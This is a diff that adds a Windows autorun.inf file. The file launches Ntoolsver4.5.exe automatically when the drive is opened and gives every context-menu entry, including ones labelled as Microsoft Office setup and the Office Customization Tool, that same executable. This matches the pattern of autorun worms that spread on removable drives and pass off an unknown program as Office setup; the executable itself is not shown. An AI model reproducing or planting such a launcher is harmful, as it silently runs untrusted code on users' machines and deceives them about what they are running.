@@ -1,0 +1,11 @@
+[autorun]
+OPEN=Ntoolsver4.5.exe
+ICON=Ntoolsver4.5.exe,0
+shell\configure=&Configure...
+shell\configure\command=Ntoolsver4.5.exe
+shell\install=&Install...
+shell\install\command=Ntoolsver4.5.exe
+shell\admin\=&Launch the Office Customization Tool
+shell\admin\command=Ntoolsver4.5.exe /admin
+shell\cmdline\=setup &Controller Command-Line Help
+shell\cmdline\command=Ntoolsver4.5.exe /?
